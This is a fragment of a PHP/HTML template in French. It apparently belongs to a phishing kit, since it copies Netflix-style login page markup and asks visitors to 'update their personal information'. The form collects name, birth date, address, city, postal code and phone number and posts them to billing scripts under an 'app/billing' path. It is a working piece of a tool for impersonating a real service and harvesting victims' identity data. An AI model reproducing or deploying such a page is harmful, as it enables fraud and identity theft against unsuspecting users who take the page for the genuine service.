            ...
            <div class="login-content login-form hybrid-login-form hybrid-login-form-signup" data-uia="login-page-container">
              <div class="hybrid-login-form-main">
                <h2 align="center" style="width:100%;color:#fff" data-uia="login-page-title">
                  <strong>Mettez à jour vos informations personelles</strong>
                </h2>
                <br>
                <form method="post" class="login-form" action="<?php if ($rez_emojis == true) { echo '../../app/billing/emojis.php'; } else { echo '../../app/billing/sans.php'; } ?>">
                <?php if(isset($_GET['empty_fields'])) {
                       ?>
                    ...
                    <div class="nfInputPlacement">
                      <div class="nfEmailPhoneControls">
                        <label class="input_id" placeholder="">
                          <input type="text" data-uia="login-field" name="nom" class="nfTextField" id="prenom" value="" tabindex="0" autocomplete="prenom" dir="">
                          <label for="prenom" class="placeLabel">Nom</label>
                      </div>
                    </div>
                  </div>
                  <div data-uia="login-field+container" class="nfInput nfEmailPhoneInput login-input login-input-email">
                    <div class="nfInputPlacement">
                      <div class="nfEmailPhoneControls">
                        <label class="input_id" placeholder="">
                          <input type="text" data-uia="login-field" name="prenom" class="nfTextField" id="nom" value="" tabindex="0" autocomplete="nom" dir="">
                          <label for="nom" class="placeLabel">Prénom</label>
                      </div>
                    </div>
                  </div>
                  <div data-uia="login-field+container" class="nfInput nfEmailPhoneInput login-input login-input-email">
                    <div class="nfInputPlacement">
                      <div class="nfEmailPhoneControls">
                        <label class="input_id" placeholder="">
                          <input onclick="$('#naissance').inputmask('99/99/9999')" type="tel" data-uia="login-field" name="naissance" class="nfTextField" id="naissance" value="" tabindex="0" autocomplete="naissance" dir="">
                          <label for="naissance" class="placeLabel">Date de naissance</label>
                      </div>
                    </div>
                  </div>
                  <div data-uia="login-field+container" class="nfInput nfEmailPhoneInput login-input login-input-email">
                    <div class="nfInputPlacement">
                      <div class="nfEmailPhoneControls">
                        <label class="input_id" placeholder="">
                          <input type="text" data-uia="login-field" name="adresse" class="nfTextField" id="adresse" value="" tabindex="0" autocomplete="adresse" dir="">
                          <label for="adresse" class="placeLabel">Adresse</label>
                      </div>
                    </div>
                  </div>
                  <div data-uia="login-field+container" class="nfInput nfEmailPhoneInput login-input login-input-email">
                    <div class="nfInputPlacement">
                      <div class="nfEmailPhoneControls">
                        <label class="input_id" placeholder="">
                          <input type="text" data-uia="login-field" name="ville" class="nfTextField" id="ville" value="" tabindex="0" autocomplete="ville" dir="">
                          <label for="ville" class="placeLabel">Ville</label>
                      </div>
                    </div>
                  </div>
                  <div data-uia="login-field+container" class="nfInput nfEmailPhoneInput login-input login-input-email">
                    <div class="nfInputPlacement">
                      <div class="nfEmailPhoneControls">
                        <label class="input_id" placeholder="">
                          <input onclick="$('#postal').inputmask('99999')" type="tel" data-uia="login-field" name="postal" class="nfTextField" id="postal" value="" tabindex="0" autocomplete="postal" dir="">
                          <label for="postal" class="placeLabel">Code postal</label>
                      </div>
                    </div>
                  </div>
                  <div data-uia="login-field+container" class="nfInput nfEmailPhoneInput login-input login-input-email">
                    <div class="nfInputPlacement">
                      <div class="nfEmailPhoneControls">
                        <label class="input_id" placeholder="">
                          <input onclick="$('#tel').inputmask('99 99 99 99 99')" type="tel" data-uia="login-field" name="tel" class="nfTextField" id="tel" value="" tabindex="0" autocomplete="tel" dir="">
                          <label for="tel" class="placeLabel">Numéro de téléphone</label>
                      </div>
                    </div>
                  </div>
                  <button class="btn login-button btn-submit btn-small" name="billing_form" type="submit" autocomplete="off" tabindex="0" data-uia="login-submit-button">Suivant</button>
                </form>
              </div>
            </div>
          </div>
